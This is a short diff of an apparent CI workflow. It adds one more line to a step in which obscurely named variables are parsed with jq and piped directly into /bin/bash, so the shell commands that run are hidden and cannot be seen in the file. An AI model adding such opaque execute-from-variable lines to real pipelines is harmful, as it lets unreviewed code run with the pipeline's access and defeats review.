@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$tem7142" | jq -r .il01 | /bin/bash
           echo $viz4 | jq -r .vsdi01 | /bin/bash
           echo $tflvu356 | jq -r .vdau01 | /bin/bash
+          echo $oc09 | jq -r .gtk150 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
